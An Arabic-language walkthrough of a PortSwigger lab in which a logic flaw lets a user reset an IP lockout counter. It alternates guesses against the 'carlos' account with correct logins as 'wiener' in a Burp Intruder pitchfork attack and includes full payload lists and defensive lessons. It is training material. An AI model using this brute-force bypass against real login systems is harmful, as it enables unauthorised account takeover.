# Lab Broken brute - force protection , IP block

https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

- الفكره من الLab ده ان الموقع بعد 3 محاوله غلط بيقولك استنه دقيقه  بس لو دخلت مره صح قبل ما العدد يخلص بيرستر عدد المرات تاني فا هنستخدم pitchfork attack in intruder by  burpsuite  وممكن نخلي محاوله صح ومحاوله غلط لاحاد اما نلاقي الpassword الصح

```bash
1. username :
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos

2. password :
123456
peter
password
peter
12345678
peter
qwerty
peter
123456789
peter
12345
peter
1234
peter
111111
peter
1234567
peter
dragon
peter
123123
peter
baseball
peter
abc123
peter
football
peter
monkey
peter
letmein
peter
shadow
peter
master
peter
666666
peter
qwertyuiop
peter
123321
peter
mustang
peter
1234567890
peter
michael
peter
654321
peter
superman
peter
1qaz2wsx
peter
7777777
peter
121212
peter
000000
peter
qazwsx
peter
123qwe
peter
killer
peter
trustno1
peter
jordan
peter
jennifer
peter
zxcvbnm
peter
asdfgh
peter
hunter
peter
buster
peter
soccer
peter
harley
peter
batman
peter
andrew
peter
tigger
peter
sunshine
peter
iloveyou
peter
2000
peter
charlie
peter
robert
peter
thomas
peter
hockey
peter
ranger
peter
daniel
peter
starwars
peter
klaster
peter
112233
peter
george
peter
computer
peter
michelle
peter
jessica
peter
pepper
peter
1111
peter
zxcvbn
peter
555555
peter
11111111
peter
131313
peter
freedom
peter
777777
peter
pass
peter
maggie
peter
159753
peter
aaaaaa
peter
ginger
peter
princess
peter
joshua
peter
cheese
peter
amanda
peter
summer
peter
love
peter
ashley
peter
nicole
peter
chelsea
peter
biteme
peter
matthew
peter
access
peter
yankees
peter
987654321
peter
dallas
peter
austin
peter
thunder
peter
taylor
peter
matrix
peter
mobilemail
peter
mom
peter
monitor
peter
monitoring
peter
montana
peter
moon
peter
moscow
peter
```

اللاب ده من فئة **Authentication vulnerabilities**، وتحديدًا **Broken brute-force protection** بسبب خلل منطقي (logic flaw) في آلية الحماية من هجمات تخمين الباسورد.

### آلية الحماية الموجودة (وليه هي معيوبة)

الموقع بيحمي نفسه من brute-force بالطريقة دي:

- لو حاولت تسجل دخول بمعلومات غلط **3 مرات متتالية**، الـ IP بتاعك بيتحظر مؤقتًا.

المشكلة: **العداد (counter) بتاع المحاولات الفاشلة بيتصفّر لو نجحت تسجل دخول صحيح**. يعني لو عملت:

```
محاولة غلط 1
محاولة غلط 2
تسجيل دخول صحيح (بحسابك الشخصي)
```

العداد بيرجع صفر، وتقدر تبدأ تجرب من الأول من غير ما تتحظر أبدًا — طالما إنك بتنجح مرة كل شوية.

### فكرة الاستغلال

بما إنك تعرف حسابك (`wiener:peter`) وباسورده صحيح دايمًا، تقدر **تناوب** بين محاولة تسجيل دخول بحساب `carlos` (بباسورد مخمّن) وبين تسجيل دخول بحسابك (`wiener:peter` الصحيح). كل مرة تنجح في حسابك، العداد بيتصفر، فمينفعش الـ IP يتحظر أبدًا مهما جربت باسوردات كتير لـ `carlos`.

### خطوات الحل بالتفصيل (باستخدام Burp Intruder)

#### 1. لاحظ السلوك

جرب تدخل بباسورد غلط 3 مرات، هتتحظر مؤقتًا. جرب تاني بس المرادين دخّل بحسابك الصح في النص، هتلاقي إنك منعتش الحظر.

#### 2. جهّز الريكوست في Burp Intruder

سجل محاولة دخول غلط (username/password وهميين)، وابعت الريكوست:

```
POST /login HTTP/1.1
...
username=x&password=y
```

لـ **Burp Intruder**، واختار نوع الهجوم **Pitchfork attack** (بيمشي على متغيرين مع بعض بالتوازي، مش كل تركيبة مع كل تركيبة زي Cluster bomb).

حدد الـ **payload positions** على قيمة الـ `username` والـ `password`.

#### 3. اضبط Resource Pool

افتح **Resource pool** panel، واعمل pool جديد بـ:

```
Maximum concurrent requests = 1
```

ده مهم جدًا عشان تضمن إن الريكوستات بتتبعت **بالترتيب الصحيح واحد ورا التاني**، مش بالتوازي (لأن لو اتبعتوا في نفس الوقت، السيرفر ممكن يلخبط ترتيب العداد).

#### 4. جهّز الـ Payload الأول (Username)

في تبويب **Payloads**، اختار **Position 1**، وحط قائمة بتتناوب كده:

```
wiener
carlos
wiener
carlos
wiener
carlos
...
```

يعني `wiener` (يوزرك) وبعده `carlos`، وكررها لحد ما تغطي كل الباسوردات المرشحة (100+ مرة).

#### 5. جهّز الـ Payload الثاني (Password)

خد **قائمة الباسوردات المرشحة** (candidate passwords) من الرابط اللي PortSwigger مديهولك، وحط قدام كل باسورد فيها **باسوردك الصح** (`peter`)، بحيث الترتيب يبقى متزامن مع الـ username list:

```
peter        ← مقابل wiener
password123  ← مقابل carlos
peter        ← مقابل wiener
letmein      ← مقابل carlos
...
```

كل صف من الاتنين لازم يكون **محاذي (aligned)** صح: يعني كل مرة `wiener` ييجي، يبقى قدامه `peter` بالظبط، وكل مرة `carlos` ييجي، يبقى قدامه باسورد مختلف من القائمة.

#### 6. اختار Position 2 وحط قائمة الباسوردات دي، وشغّل الهجوم (Start attack).

#### 7. حلّل النتائج

لما الهجوم يخلص:

- **فلتر النتائج** عشان تشيل أي response بحالة **`200`** (يعني فشل تسجيل الدخول - رجعتلك نفس صفحة اللوجن).
- الباقي غالبًا هيكون **`302`** (redirect بعد نجاح تسجيل الدخول).
- **رتّب النتائج حسب الـ username**.
- هتلاقي:
    - كل محاولات `wiener` بترجع `302` (لأن الباسورد صح دايمًا).
    - محاولات `carlos` كلها بترجع `200` (فشل) **إلا واحدة بس** بترجع `302` — دي المحاولة اللي فيها الباسورد الصحيح بتاعه.

#### 8. سجل الباسورد الصحيح

حدد الـ response بتاع `carlos` اللي طلع `302`، وشوف قيمة الـ **Payload 2** (الباسورد) المقابلة له.

#### 9. سجل دخول بالباسورد اللي لقيته

```
username: carlos
password: <الباسورد اللي طلع من الهجوم>
```

افتح صفحة حسابه، واللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

الكود بيكون شبه كده:

python

```python
failed_attempts = get_failed_attempts(ip_address)if failed_attempts >= 3:    return "IP blocked, try again later", 429if not check_credentials(username, password):    increment_failed_attempts(ip_address)    return "Invalid credentials", 200else:    reset_failed_attempts(ip_address)   # ❌ هنا المشكلة    return "Login successful", 302
```

العداد بيتصفّر عند **أي نجاح تسجيل دخول**، بغض النظر عن اليوزر اللي نجح. المفروض العداد يترتبط بمحاولات فاشلة **على حساب معين (carlos)** أو يكون فحص أعمق من مجرد "هل آخر محاولة نجحت"، مش يعتمد على نجاح عام لأي حساب من نفس الـ IP.

### الدرس المستفاد

- آليات الحماية من brute-force **لازم تكون محكمة المنطق**، وميبنيش على افتراضات سهلة الالتفاف حواليها (زي "لو نجح تسجيل دخول يبقى صاحب الـ IP موثوق").
- **الحظر على مستوى الحساب المستهدف (account-based lockout)** أفضل بكتير من الحظر على مستوى الـ IP بس، لأن الـ IP ممكن يتغير (أو يتلاعب فيه المهاجم بطرق كتير)، وأيضًا لأن نجاح تسجيل دخول لحساب A منطقيًا مالوش علاقة بمحاولات فاشلة على حساب B.
- استخدام **Resource Pool مع Concurrent requests = 1** مهم جدًا في هجمات الـ brute-force اللي بتعتمد على **ترتيب زمني معين** للريكوستات، لأن لو الريكوستات راحت بالتوازي، السيرفر ممكن يتعامل معاها بترتيب مختلف عن اللي انت مخطط له ويبوظلك الهجوم.
- **Pitchfork attack** في Burp Intruder مفيد جدًا لما يكون عندك **متغيرين مرتبطين ببعض بشكل متزامن** (زي username و password هنا)، عكس الـ Cluster bomb اللي بيجرب كل التوليفات الممكنة.
